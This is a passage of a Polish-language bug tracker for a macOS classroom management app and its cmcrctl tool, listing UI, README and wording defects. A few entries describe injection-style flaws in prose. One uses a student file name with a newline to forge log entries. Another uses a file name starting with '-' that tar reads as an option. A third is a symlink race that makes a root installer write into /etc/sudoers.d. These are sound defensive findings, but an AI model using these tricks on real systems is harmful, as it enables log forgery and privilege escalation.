Po imporcie listy z innego Maca (usesSharedPassword = false) albo po nieudanym zapisie do Pęku kluczy tabela pokazuje „Własne” z podpowiedzią „Ma własne hasło zapisane w Pęku kluczy”, arkusz pokazuje „Bez zmian”, a Keychain.password(for:) po cichu używa hasła wspólnego (logowanie kończy się „Odmowa dostępu”). `cmcrctl password status` w tej sytuacji pisze „własne hasło – brak”.

**Status:** otwarte

### KON-13

**Błąd importu listy nie wskazuje miejsca problemu** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:382`

ConfigStore.importHosts używa gołego JSONDecoder, więc okno „Nie można wczytać listy” pokazuje ogólny tekst Foundation (np. „nie mają prawidłowego formatu”), choć HostsFile.decodeHosts/describe daje „brak pola „address” (wpis nr 2)” – tak jak cmcrctl.

**Status:** otwarte

### KON-14

**Generator listy w aplikacji nie sprawdza prefiksu i domeny (cmcrctl je odrzuca)** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:399`

HostListGeneratorSheet tworzy wpisy z dowolnego prefiksu/domeny (np. „imac ” ze spacją, „-x”, „imac;”) i od razu je dopisuje albo zastępuje nimi listę; problem widać dopiero jako trójkąty w tabeli. `cmcrctl hosts generate` odrzuca takie wartości (ConfigCommands.swift:106 i 110). Tabela nie oznacza też nazw z przecinkiem lub „-” na początku, które CLI odrzuca (HostEntry.problem(.name)).

**Status:** otwarte

### KON-15

**Własne hasła zastąpionych lub usuniętych wpisów zostają w Pęku kluczy** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:511`

„Zastąp całą listę…” (komunikat: „własne hasła obecnych wpisów przepadną”), import listy i `cmcrctl hosts remove` (ConfigCommands.swift:97) usuwają wpisy, ale nie usuwają ich elementów admin-<uuid> z Pęku kluczy – inaczej niż „Usuń z listy…” (askDelete, linia 364). Hasła administratorów zostają na Macu nauczyciela bez możliwości usunięcia ich z aplikacji.

**Status:** otwarte

### KON-16

**„Utwórz (nowy) klucz” ignoruje klucz ustawiony w Ustawieniach › Połączenie** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:680`

SSHKeys.generate zawsze tworzy ~/.ssh/id_ed25519, a currentPrivateKey używa settings.identityFile, gdy jest ustawiony. Przy własnym kluczu przycisk „Utwórz nowy klucz” tworzy klucz, który nie będzie używany ani rozsyłany; gdy ustawiony plik nie istnieje, sekcja dalej pokazuje „Brak klucza”, „Roześlij klucz” jest wyłączone, a kolejne kliknięcie kończy się „Klucz … już istnieje”.

**Status:** otwarte

### KON-17

**„Roześlij klucz” jest aktywne bez pliku .pub i kończy się samym sygnałem dźwiękowym** – P2, Konfiguracja, `Sources/CMCRManager/SetupView.swift:762`

Przycisk jest wyłączany tylko, gdy brak klucza prywatnego (currentKey == nil). Gdy w Ustawieniach wybrano klucz bez pliku .pub (sekcja pokazuje „(brak pliku .pub)”), AppModel.distributeKey robi NSSound.beep() i nic nie zgłasza. W Przygotowaniu iMaców ta sama akcja jest wyłączana przez managerPublicKey == nil.

**Status:** otwarte

### PLI-06

**Nazwa komputera z „/” psuje „Zbierz prace”** – P2, Pliki, przeglądarka, `Sources/CMCRCore/Operations+Browse.swift:91`

Folder hosta to folder.appendingPathComponent(name) z surowego Machine.name (FilesState.swift:152). Nazwy nie są sprawdzane pod kątem „/”, a aplikacja sama przewiduje takie nazwy (SSH.terminalFileName: „Sala 3/iMac”). Dla „Sala 3/iMac” moveItem do nieistniejącego „Sala 3” kończy się błędem i zebrane pliki z tego komputera są odrzucane.

**Status:** otwarte

### PLI-07

**Wysyłanie kończy się błędem, gdy pierwszy element ma nazwę zaczynającą się od „-”** – P2, Pliki, przeglądarka, `Sources/CMCRCore/SSH.swift:735`

Payload.make buduje `tar -cf out -C katalog nazwa …`; po opcji -C bsdtar dalej czyta opcje, więc pierwsza nazwa „-szkic.txt” jest traktowana jak zestaw opcji. Wysyłanie (Pliki, Przeglądarka, konwencja, materiały lekcji) kończy się „Nie udało się spakować plików: tar: Can't specify both -t and -c”.

**Status:** otwarte

### PLI-08

**Nieudany chown przy wysyłaniu daje zadanie „Gotowe”** – P2, Pliki, przeglądarka, `Sources/CMCRCore/Scripts.swift:805`

`chown -R "$OWNER" "$item" || echo "⚠︎ …" >&2` nie ustawia RC. Przy właścicielu „Inny…” z literówką (konto nie istnieje) pliki zostają root:wheel w folderze ucznia – przy uprawnieniach „Bez zmian” uczeń nie może ich edytować – a zadanie jest zielone, z ostatnim wierszem `ls -ld` jako podsumowaniem.

**Status:** otwarte

### PLI-09

**„Pokaż listę plików” nie rozwija ~ (folder w katalogu administratora)** – P2, Pliki, przeglądarka, `Sources/CMCRCore/Scripts.swift:935`

Okienko wyboru dla „Przeglądanie i porządki” zamienia katalog administratora na „~…” (tokenize z adminHome). listFolder zamienia tylko {console} i wykonuje `ls -la "$DIR"` – w cudzysłowie ~ nie jest rozwijany, więc na każdym iMacu wynik to „ls: ~/Documents: No such file or directory”. Dotyczy też `cmcrctl ls '~/…' KOMP`. „Wyczyść folder…” dla tej ścieżki kończy się mylącym „Odmowa: podaj pełną ścieżkę (podano: ~/Documents)” (Scripts.swift:874), choć powodem jest ochrona katalogu administratora.

**Status:** otwarte

### PLI-10

**Tekst o {console}: „komputery … zostaną pominięte”, a zadania kończą się błędem** – P2, Pliki, przeglądarka, `Sources/CMCRManager/FilesView.swift:80`

Przy celu z {console} komputery bez zalogowanego użytkownika nie są pomijane: archiwum jest najpierw wysyłane scp, potem pushFinalize kończy się w cmcr_require_console kodem 3 – zadanie ma stan „Błąd” (czerwone, w „Powtórz na nieudanych”), a nie „Pominięto”.

**Status:** otwarte

### PLI-11

**Podpisy „<nazwa komputera>” przy folderach konwencji, a folder nosi nazwę adresu** – P2, Pliki, przeglądarka, `Sources/CMCRManager/FilesView.swift:350`

pushConvention, pullFiles i „Przygotuj foldery” używają Machine.folderKey = adres (imac04.local), a podpisy mówią „\(local)/<nazwa komputera>” (l. 350 i 374). Nauczyciel, który utworzy ręcznie ~/Public/cmcr/imac04, dostaje „Brak plików … – nic do wysłania”.

**Status:** otwarte

### PLI-13

**Przełączenie komputera po błędzie wczytywania przenosi ścieżkę poprzedniego iMaca** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:103`

`carry = listing == nil ? path : portablePath()`. Po błędzie (np. „macOS blokuje dostęp” w /Users/imac01/Desktop administratora albo w folderze zalogowanego „jan”) listing jest nil, więc na imac02 otwierane jest „/Users/imac01/Desktop” zamiast „~/Desktop” i pojawia się „Folder nie istnieje”, wbrew „pokazuje ten sam folder”.

**Status:** otwarte

### PLI-14

**Przełącznik „Jako administrator” wraca sam do włączonego** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:196`

Wyłączenie trybu w folderze wymagającym sudo wywołuje reload → accessDenied → autoElevate ustawia `asRoot = true` i wczytuje ponownie. Przełącznika nie da się wyłączyć, a przy błędnym haśle każde kliknięcie to kolejna nieudana próba sudo.

**Status:** otwarte

### PLI-15

**Zmiany w Przeglądarce pomijane jako „niedostępny”, choć folder właśnie się wczytał** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:220`

runChange używa runBatch bez includeUnreachable. Przy „Pomiń niedostępne” komputer z nieaktualnym stanem offline (np. tuż po włączeniu) jest pomijany: lista folderu działa (Operations.browse nie pomija), a Nowy folder/Usuń/Wyślij/Pobierz kończą się „Pominięto – komputer był niedostępny przy ostatnim sprawdzeniu” do następnego odświeżenia. Udane browse nie aktualizuje stanu (brak recheckAfterLogin).

**Status:** otwarte

### PLI-16

**Wspólny stan activity/notice/lastDownload przy równoległych zmianach w Przeglądarce** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:223`

Przyciski nie są blokowane w trakcie zmiany, a runChange nadpisuje `activity`, zaś zakończenie dowolnej zmiany ustawia `activity = nil` i `notice`. Długie wysyłanie + w międzyczasie usunięcie pliku: po usunięciu pasek pokazuje „Gotowe.” bez wskaźnika, choć wysyłanie trwa; notice z poprzedniego komputera zostaje po przełączeniu hosta. Dwa pobierania naraz współdzielą `lastDownload` (l. 271, 277), więc pierwsze zakończenie pokazuje w Finderze pliki drugiego albo nic.

**Status:** otwarte

### PLI-17

**Nazwy plików ucznia trafiają bez zmian do dziennika działań (fałszywe wpisy)** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserModel.swift:250`

Tytuły zmian zawierają surowe entry.name („Zmiana nazwy: \(entry.name) → …”, „Usuń „\(name)” …” l. 259, „Pobierz …” l. 270), a runBatch zapisuje je przez ConfigStore.log bez usuwania znaków nowej linii. Uczeń tworzy plik o nazwie z „\n2026-…Z Podgląd ekranu → imac05” – po usunięciu/pobraniu go przez nauczyciela actions.log zawiera sfałszowany wiersz.

**Status:** otwarte

### PLI-18

**„Wyślij pliki do tego folderu…” zastępuje istniejące pliki bez pytania** – P2, Pliki, przeglądarka, `Sources/CMCRManager/RemoteBrowserView.swift:343`

Dla bieżącego folderu startUpload pyta „Zastąpić istniejące elementy?”, ale wysyłanie do podfolderu z menu kontekstowego woła browser.upload bez sprawdzenia. pushFinalize przenosi stary plik do $STAGE/old i na końcu `rm -rf "$STAGE"`, więc praca ucznia o tej samej nazwie w podfolderze jest trwale usuwana bez potwierdzenia.

**Status:** otwarte

### PLI-19

**Inne domyślne sudo w CLI: collect bez root dla prywatnych folderów, push z właścicielem administratora** – P2, Pliki, przeglądarka, `Sources/cmcrctl/Browse.swift:136`

GUI (FilesState.useCollectSource) automatycznie zbiera z Biurka/Dokumentów z sudo; `cmcrctl collect all --from "/Users/{student}/Desktop"` (forma z README, bez --root) działa jako administrator i kończy się „Brak dostępu do folderu”. GUI pushConvention wysyła jako root z właścicielem ucznia, a `cmcrctl push` bez --root zostawia pliki z właścicielem administratora (CLI.swift:393).

**Status:** otwarte

### PLI-20

**cmcrctl ls ŚCIEŻKA KOMP i clean nie rozwijają {student}; clean kończy się kodem 0 bez czyszczenia** – P2, Pliki, przeglądarka, `Sources/cmcrctl/CLI.swift:431`; także: `Sources/cmcrctl/CLI.swift:424`

collect --from, exists, mkdir, rm, get i rename przepuszczają ścieżkę przez settings.resolve, a CLI.listFolder (l. 423) i clean przekazują ją dosłownie. `cmcrctl clean "/Users/{student}/Desktop" all --yes` trafia w cleanFolder na `[ -d "$DIR" ] || { echo "Brak folderu: $DIR"; exit 0; }` – wypisuje „Brak folderu: /Users/{student}/Desktop”, zwraca 0 i nic nie czyści; GUI dla tej samej ścieżki czyści.

**Status:** otwarte

### PLI-24

**Kliknięcie innego komputera na liście nie przełącza Przeglądarki plików** – P2, Interfejs, `Sources/CMCRManager/RemoteBrowserView.swift:66`

README:12 obiecuje: „kliknięcie innego komputera na liście pokazuje ten sam folder na nim”. Kliknięcie wiersza tylko go jednak podświetla (prywatny stan highlighted, App.swift:252/285; README:106), a Przeglądarka reaguje wyłącznie na zmianę zaznaczenia i tylko wtedy, gdy zaznaczony jest dokładnie jeden komputer (66-70). Przy zapamiętanym zaznaczeniu kilku komputerów ani kliknięcie, ani zaznaczenie kolejnego nie zmienia przeglądanego komputera; działa tylko pole „Komputer” na pasku lokalizacji. Komentarz w linii 67 jest nieaktualny.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (7924cac). duplikat PLI-23

### PRZ-02

**„Przypomnij później” nie anuluje zleconej instalacji – po pobraniu aplikacja sama się zamyka i instaluje** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRManager/Updater.swift:468`

Gdy uaktualnienie nie jest jeszcze pobrane, przycisk „Zainstaluj i uruchom ponownie” (albo „Spróbuj ponownie” w fazie .failed) ustawia installWhenReady = true i zaczyna pobieranie (l. 355). Tak jest w fazie .available/.failed: pobieranie w tle wyłączone, wcześniej anulowane albo nieudane. Jeśli potem użytkownik wybierze „Przypomnij później” (także Esc, bo to .cancelAction), remindLater() tylko ustawia drzemkę i zamyka okno. installWhenReady zostaje, więc po pobraniu download() wywołuje installAndRelaunch() (l. 330–332). Gdy nie trwają zadania, aplikacja nagle się zamyka i instaluje nową wersję (w /Applications wyskakuje prośba o hasło administratora). To przeczy „Przypomnij później (24 h)” i zasadzie „Bez Twojej zgody nic nie jest instalowane”. Nawet bez zadań przepadają niezapisane rzeczy w oknie, np. rozpisana wiadomość.

**Status:** otwarte

### PRZ-05

**README podaje macOS 13, a aplikacja wymaga macOS 14** – P2, Przygotowanie iMaców, uaktualnienia, `README.md:34`

Wymagania: „Komputer administratora: macOS 13 lub nowszy”. Package.swift ma platforms: [.macOS(.v14)], scripts/build-app.sh wpisuje LSMinimumSystemVersion 14.0 (l. 84) i buduje x86_64 dla macosx14.0 (l. 42). Na macOS 13 aplikacja się nie uruchomi, a manifest uaktualnień (update-signing.swift bierze LSMinimumSystemVersion) odrzuci takiego Maca.

**Status:** otwarte

### PRZ-06

**Kod wyjścia 4 skryptu konfiguracyjnego nieopisany w README** – P2, Przygotowanie iMaców, uaktualnienia, `README.md:52`

README wymienia kody 0–3. Skrypt kończy się kodem 4 na macOS starszym niż 11 (setup/cmcr-imac-setup.sh:197, opisane w nagłówku l. 15 i w SetupScript.ExitCode.unsupportedOS), a opakowanie zdalne zwraca 90 przy nieudanym zapisie skryptu.

**Status:** otwarte

### PRZ-07

**README: „Skrypt sam wybiera zgodne SDK” – build-app.sh nie ma już tej logiki** – P2, Przygotowanie iMaców, uaktualnienia, `README.md:96`

Funkcję pick_sdk (wybór SDK przy samych Command Line Tools) usunięto w commicie 07f83d1 („build-app.sh: no SDK fallback needed any more”). Zastąpił ją alias ViewState zamiast makra @State. W scripts/build-app.sh nie ma SDKROOT, xcrun --sdk ani wyboru SDK, a README nadal to obiecuje.

**Status:** otwarte

### PRZ-08

**Gotowość: przy pierwszym sudo na koncie błędne hasło pokazuje się jako „błąd: WARNING: Improper use…” zamiast „złe hasło”** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRCore/Scripts+Setup.swift:425`

Klasyfikacja błędu sudo bierze tylko pierwszą niepustą linię stderr. Przed pierwszą udaną autoryzacją sudo w macOS wypisuje ostrzeżenie (lecture) „WARNING: Improper use of the sudo command…”. Stderr nie jest wtedy terminalem, więc ostrzeżenie trafia do readiness.err przed „Sorry, try again”. Scenariusz: nowy iMac i złe zapisane hasło. Kolumna „Hasło administratora” pokazuje „błąd” i „sudo nie działa: WARNING: Improper use of the sudo command could lead to data loss.”. Wyświetla tak przy każdym sprawdzeniu, bo bez udanej autoryzacji ostrzeżenie się nie wyłącza.

**Status:** otwarte

### PRZ-09

**Instalator jako root dopisuje dziennik do ścieżki w katalogu użytkownika (podąża za dowiązaniem, TOCTOU)** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRCore/SelfUpdate.swift:764`

privilegedAppleScript buduje polecenie `… >> '~/Library/Logs/CMCRManager/update.log' 2>&1 &` uruchamiane przez „do shell script … with administrator privileges”, więc plik dziennika otwiera powłoka roota. openLog() (l. 751) sprawdza zapis jako użytkownik, ale wcześniej. Między tym sprawdzeniem a otwarciem przez roota trwa okno z hasłem administratora (sekundy–minuty). Scenariusz: proces na koncie nauczyciela podmienia w tym czasie update.log na dowiązanie, np. do /etc/sudoers.d/x albo /etc/nologin. Root utworzy ten plik lub dopisze do niego wiersze dziennika, a te zawierają m.in. ścieżkę aplikacji, którą użytkownik może nazwać dowolnie, także z nowym wierszem. Funkcja status() w helperze świadomie unika takich zapisów (zapis jako użytkownik), log() nie. Priorytet P2, bo wymaga wcześniejszego wykonania kodu na koncie nauczyciela; to wzmocnienie obrony.

**Status:** otwarte

### PRZ-10

**cmcrctl: przy błędnych literach dni harmonogramu komunikat „wybierz co najmniej jeden dzień”** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRCore/SetupScript.swift:92`

Jeden komunikat obsługuje pusty i niepoprawny ciąg dni. W CLI `cmcrctl setup 1 --power-schedule "MTWXF 07:30"` lub "mtwrf 07:30" daje „✘ Harmonogram: wybierz co najmniej jeden dzień.” (sprawdzone, kod 2), choć dni podano. Użytkownik terminala nie wie, że chodzi o wielkie litery M T W R F S U.

**Status:** otwarte

### PRZ-11

**cmcrctl setup ignoruje zapisane opcje i po cichu cofa „Logowanie zdalne tylko kluczem”** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRCore/SetupScript.swift:384`

Aplikacja zapisuje opcje w setup-options.json (SetupOptions.load/save), a CLI zawsze zaczyna od SetupOptions() (SetupCommandLine.options, SetupCommands.swift:30). Opcje dwustanowe (sshKeyOnly, restrictSSH, sshKeepAlive, sharedACL, wakeOnLAN) nie mają stanu „bez zmian”. Scenariusz: iMaki skonfigurowano w aplikacji z „Logowanie zdalne tylko kluczem”, a potem uruchomiono `cmcrctl setup all` zgodnie z README, np. po zmianie wersji skryptu. Plik 050-cmcr-manager.conf zostaje nadpisany bez PasswordAuthentication no, więc logowanie hasłem wraca. Raport mówi tylko „Zapisano … (nowe połączenia SSH od razu go używają)”, a --verify „zapisać ustawienia sshd (keepalive)”. README: cmcrctl „korzysta z tej samej konfiguracji … co aplikacja”.

**Status:** otwarte

### PRZ-12

**Ponowne sprawdzenie po naprawie jest pomijane, gdy dla iMaca trwa wcześniejsze sprawdzenie – tabela pokazuje stan sprzed naprawy** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRManager/ReadinessView.swift:23`

ReadinessStore.check odrzuca komputery, które są już w `checking`. Szybka naprawa (applyReadinessFix → onResult → ReadinessStore.shared.check([m]), l. 119) i koniec konfiguracji wołają check. Jeśli dla tego iMaca trwa jeszcze sprawdzenie uruchomione wcześniej („Sprawdź wszystkie”, „Sprawdź ponownie”, automatyczne przy otwarciu – z sudo i próbą osascript do 10 s), nowe sprawdzenie nie startuje. Starszy wynik, odczytany przed naprawą (np. WoL „wyłączony”), nadpisuje komórkę i nic go już nie odświeży. Naprawa wygląda na nieskuteczną. Komórka jest klikalna także w trakcie sprawdzania (tylko przygaszona).

**Status:** otwarte

### PRZ-13

**Komórka gotowości proponuje naprawę, która nie może pomóc („brak konta” → Utwórz folder ucznia, „nie admin” → Hasło tego komputera…)** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRManager/ReadinessView.swift:804`

fixButton dopasowuje tylko kolumnę i stan. Folder „brak konta” (nostudent, .problem) dostaje wyróżniony przycisk „Utwórz folder ucznia”. Scripts.createStudentFolder kończy się wtedy zawsze błędem „Na tym iMacu nie ma konta ucznia”, choć sam opis komórki każe utworzyć konto. „Hasło administratora: nie admin” (.problem, l. 800) dostaje „Hasło tego komputera…”, a zmiana hasła nie zrobi z konta administratora.

**Status:** otwarte

### PRZ-14

**Aplikacja pozwala uruchomić lub zapisać skrypt z niepoprawnym folderem ucznia (CLI to blokuje)** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRManager/SetupOptionsSheet.swift:122`

sharedFolderProblem trafia tylko do ostrzeżeń (l. 156). Przyciski „Skonfiguruj N komputerów”, „Tylko sprawdź” (l. 109) i „Zapisz…” blokuje wyłącznie validationError(). Scenariusz: folder „/Volumes/Dane/cmcr” albo „~/Public/cmcr” w ustawieniach. Każde zadanie roota kończy się wtedy kodem 2 („folder współdzielony musi leżeć w /Users/<konto>/…”), a zapisany plik odmawia działania dopiero przy iMacu, po przejściu do każdego komputera. `cmcrctl setup` w tej samej sytuacji kończy się od razu kodem 2 (SetupCommands.swift:51).

**Status:** otwarte

### PRZ-15

**„Tylko sprawdź”/--dry-run twierdzi „Usunięto prawo zapisu…” i nie liczy tej zmiany** – P2, Przygotowanie iMaców, uaktualnienia, `setup/cmcr-imac-setup.sh:475`

Gdy katalog domowy admina jest zapisywalny dla grupy lub innych (sshd StrictModes odrzuca wtedy klucz), w trybie --verify `run chmod` nic nie robi, ale `detail` i tak wypisuje „Usunięto prawo zapisu grupy/innych z … (wymóg sshd)”. Nie powstaje też wpis „Wymaga zmiany”. Jeśli klucz już jest w authorized_keys, raport „Tylko sprawdź” mówi „Klucz SSH menedżera jest już zainstalowany” i „Do zmiany: 0”, choć logowanie kluczem nie działa. W trybie apply chmod nie jest liczony jako zmiana („Bez zmian – wszystko było już skonfigurowane”).

**Status:** otwarte

### PRZ-16

**Nieudane pmset -a (WoL, uśpienie) i scutil --set są połykane – raport mówi „bez zmian”, kod 0** – P2, Przygotowanie iMaców, uaktualnienia, `setup/cmcr-imac-setup.sh:717`

W pm_set wynik `run pmset -a …` decyduje tylko o dopisaniu do PM_DID. Gdy pmset zwróci błąd, ustawienie nie trafia ani do PM_DID, ani do PM_OK, a krok kończy się „Ustawienia zasilania bez zmian.” (skipped, l. 734) albo listą innych ustawień, z kodem 0. Przykład: nieudane `pmset -a womp 1` wygląda na sukces, choć README mówi „włącza Wake-on-LAN”. Poprawka z d87b260 objęła tylko `pmset repeat`. Podobnie step_hostname (l. 789–791) i su_set: niepowodzenie scutil/defaults daje „changed”.

**Status:** otwarte

### PRZ-18

**„Sprawdź teraz” w oknie Ustawień (i „Sprawdź uaktualnienia…” bez widocznego głównego okna) pokazuje wynik w niewidocznym arkuszu** – P2, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRManager/UpdateViews.swift:357`

checkNow() (Updater.swift:230-234) tylko ustawia isSheetPresented = true, a arkusz uaktualnień jest podpięty wyłącznie do głównego okna (App.swift:129 .updaterUI). Przycisk „Sprawdź teraz” w osobnym oknie Ustawienia › Uaktualnienia (SetupView.swift:1038) nie wysuwa głównego okna, w odróżnieniu od „Pokaż szczegóły…” w tej samej sekcji (UpdateViews.swift:331-332, MainWindow.bringToFront). Scenariusz: nauczyciel klika „Sprawdź teraz” w oknie Ustawień. Arkusz z wynikiem („Masz najnowszą wersję”, błąd sieci albo instalacja) pojawia się na głównym oknie, za oknem Ustawień, więc kliknięcie wygląda na bezskuteczne, a błąd sprawdzania nie jest nigdzie widoczny. Gdy główne okno jest zamknięte, a aplikacja działa dalej (trwają zadania, App.swift:20-22, albo otwarta jest Ściana ekranów), menu „Sprawdź uaktualnienia…” (UpdateViews.swift:11) nic nie pokazuje. isSheetPresented=true ukrywa przy tym baner na pasku bocznym (showsBanner, Updater.swift:144).

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** otwarte

### TXT-01

**Podpowiedź „Ściana ekranów” obiecuje tylko zaznaczone komputery, a okno domyślnie pokazuje wszystkie** – P2, Teksty, `Sources/CMCRManager/MainToolbar.swift:59`

Podpowiedź przycisku na pasku narzędzi brzmi „Pokaż ekrany wszystkich zaznaczonych komputerów w osobnym oknie…”. Ściana ma jednak domyślne źródło `.all`, niezależne od zaznaczenia (ScreenWall.swift:103, ScreenWallSource). Nauczyciel zaznacza 3 komputery i klika przycisk zgodnie z podpowiedzią. Otwiera się podgląd wszystkich komputerów z listy, a każdy zalogowany uczeń dostaje komunikat „Administrator rozpoczął podgląd Twojego ekranu”. Tekst wprowadza w błąd co do skutku. ScreensView.swift:31 opisuje to poprawnie: „pokazuje wszystkie komputery naraz”.

**Status:** otwarte

### TXT-02

**README: filtr i skrót opisane jako „online”, w UI to „Włączone”** – P2, Teksty, `README.md:106`

README pisze „filtr stanu (online, niedostępne, …)” i „⇧⌘O zaznacz online”. W UI filtr nazywa się „Włączone” (App.swift:505, „like everywhere else”), a pozycja menu ⇧⌘O to „Zaznacz włączone komputery” (App.swift:63). Ta sama linia ma też zdanie bez spójnika: „…były wyłączone (offline) — także w trakcie ponownego sprawdzania — zamiast czekać na limit czasu — trafiają do wyników jako pominięte…”. README:9 również mówi „Stan pracowni (online, …)”.

**Status:** otwarte

### TXT-03

**README: „Pliki › Konwencja cmcr-helpers” – takiej pozycji nie ma** – P2, Teksty, `README.md:114`

Tabela odpowiedników wskazuje „Pliki › Konwencja cmcr-helpers” (cmcr-push) oraz „… › Pobierz” (115). Sekcja nazywa się „Foldery „all” i komputerów (jak w cmcr-helpers)” (FilesView.swift:380) i ma przyciski „Tylko foldery komputerów”, „Wyślij wszystko” i „Pobierz”. Nazwa zmieniła się w commicie 2295211 („native grouped forms”), README pozostało bez zmian.

**Status:** otwarte

### TXT-04

**README: „Anuluj” zatrzymuje polecenie – przycisk to „Przerwij”; stan „Przerwano” vs wynik „Anulowano”** – P2, Teksty, `README.md:177`

README: „**Anuluj** zatrzymuje polecenie także na iMacu”. Wszystkie przyciski zatrzymujące zadania nazywają się „Przerwij” (Components.swift:536 i 700, ActivityViews.swift:193, ClassroomView.swift:496). Ten sam przerwany job ma w kolumnie Stan „Przerwano” (AppModel+Jobs.swift:33), a w kolumnie Wynik „Anulowano” (AppModel.swift:431 i 442, SSH.swift:662).

**Status:** otwarte

### TXT-05

**Komunikat SSH: zła nazwa „Logowanie zdalne” i dwuznaczne „na tym Macu”** – P2, Teksty, `Sources/CMCRCore/SSH.swift:689`

Przy „Connection refused” użytkownik widzi: „Połączenie odrzucone – włącz „Logowanie zdalne” (Remote Login) na tym Macu.”. Komunikat trafia do wyniku zadania, podpowiedzi wiersza komputera, inspektora i komórki SSH w Gotowości. W macOS i w całym projekcie opcja nazywa się „Zdalne logowanie” (README:36, setup). W aplikacji „ten Mac” konsekwentnie oznacza komputer nauczyciela („Dotyczy tego Maca (nie iMaców)”, ReadinessView.swift:859; „Pęk kluczy tego Maca”). Komunikat podsuwa więc włączenie SSH na Macu nauczyciela zamiast na iMacu. Podobnie niespójne są Scripts+Setup.swift:40 („Logowanie zdalne działa…”) oraz SetupOptionsSheet.swift:283 („Logowanie zdalne tylko kluczem”) obok :169 („Zdalne logowanie tylko dla administratorów”).

**Status:** otwarte

### TXT-06

**Komunikaty o iMacu ucznia mówią „ten Mac”, czyli w aplikacji Mac nauczyciela** – P2, Teksty, `Sources/CMCRCore/ScreenCapture.swift:149`

Na kafelku podglądu konkretnego iMaca widać „Zrzut ekranu nieudany. Na tym Macu nadaj sesjom SSH uprawnienie…”. W linii 147 jest „…nie jest administratorem tego Maca”. W aplikacji „ten Mac” konsekwentnie znaczy komputer nauczyciela („Folder na tym Macu”, „Klucz logowania tego Maca”, „Dotyczy tego Maca (nie iMaców)”). Nauczyciel może więc nadawać uprawnienie Nagrywania ekranu na własnym Macu. Mniej mylące, bo pokazywane w wyniku konkretnego iMaca, są zdalne komunikaty Scripts+Classroom.swift:43, 74, 76 i Scripts.swift:764, 949, 1070.

**Status:** otwarte

### TXT-07

**Wynik „wyłączenia za N min” odsyła do przycisku „Anuluj zaplanowane”** – P2, Teksty, `Sources/CMCRCore/Scripts+Classroom.swift:257`

Po zaplanowaniu restartu, wyłączenia lub uśpienia (GUI i cmcrctl power-later) wynik mówi: „Można to anulować przyciskiem „Anuluj zaplanowane”.”. Takiego przycisku nie ma. W GUI jest „Odwołaj” w wierszu „Zaplanowane na później” (PowerView.swift:167, 387), w CLI `cmcrctl power-cancel`. Tytuł zadania odwołania „Anuluj zaplanowane wyłączenie/restart” (ClassroomModel.swift:454) pomija uśpienie i używa innego czasownika niż przycisk.

**Status:** otwarte

### TXT-08

**Komunikaty gotowości odsyłają do przycisków, których nie ma** – P2, Teksty, `Sources/CMCRCore/Scripts+Setup.swift:166`

Komórka SSH (stan „hasło”) każe użyć „Roześlij klucz SSH”. Przycisk nazywa się „Roześlij klucz” (SetupView.swift:759), a w dymku tej komórki przycisk naprawy to „Zainstaluj klucz logowania” (ReadinessView.swift:783). Linia 168 odsyła do „Dostęp i hasła › Wygeneruj nowy klucz”, a przycisk to „Utwórz klucz” lub „Utwórz nowy klucz” (SetupView.swift:690).

**Status:** otwarte

### TXT-09

**„w Konfiguracja › …” – zły przypadek; dwuznaczne „w Ustawieniach”** – P2, Teksty, `Sources/CMCRCore/Scripts+Setup.swift:175`

Szczegóły gotowości w liniach 175, 179 i 193 mówią „zapisz je w Konfiguracja › Dostęp i hasła” i „popraw nazwę w Konfiguracja › Ustawienia”. Po „w” potrzebny jest miejscownik, a reszta aplikacji pisze „w Konfiguracji › …” (ScreenCapture.swift:145, App.swift:307). W 193 „Utwórz je w Ustawieniach (Użytkownicy i grupy)” chodzi o Ustawienia systemowe, ale w tym samym zdaniu pada „Konfiguracja › Ustawienia” aplikacji. Ta sama dwuznaczność jest w komunikacie uaktualnienia SelfUpdate.swift:879 („(Ustawienia › Prywatność i ochrona › Zarządzanie aplikacjami?)”), który aplikacja pokazuje jako powód błędu.

**Status:** otwarte

### TXT-10

**Komunikat odmowy instalacji odsyła do nieistniejącego przełącznika** – P2, Teksty, `Sources/CMCRCore/Scripts.swift:369`

Po odrzuceniu niepodpisanego instalatora wynik zadania mówi: „zaznacz „Zezwól na instalatory bez podpisu” w dziale Instalacja”. Przełącznik nazywa się jednak „Zezwalaj na instalatory bez podpisu Apple” i leży w sekcji „Bezpieczeństwo” (InstallView.swift:76, 81; README:170).

**Status:** otwarte

### TXT-12

**Ta sama akcja „sesja SSH w Terminalu” ma cztery różne nazwy** – P2, Teksty, `Sources/CMCRManager/App.swift:668`

README:113 wskazuje „menu kontekstowe › Sesja SSH w Terminalu”. W menu kontekstowym listy komputerów pozycja nazywa się jednak „Otwórz w Terminalu (SSH)” (lub „(pierwsze 4)”). „Sesja SSH w Terminalu” jest tylko w menu kafelka podglądu (ScreenTiles.swift:415). Dalej są „Otwórz w Terminalu (dla zaawansowanych)” (DashboardView.swift:122) i „Otwórz w Terminalu” (HostInspector.swift:130, CommandsView.swift:68).

**Status:** otwarte

### TXT-13

**Panel szczegółów: „120 GB wolne” i „Szyfrowanie dysku: włączony”** – P2, Teksty, `Sources/CMCRManager/HostInspector.swift:70`

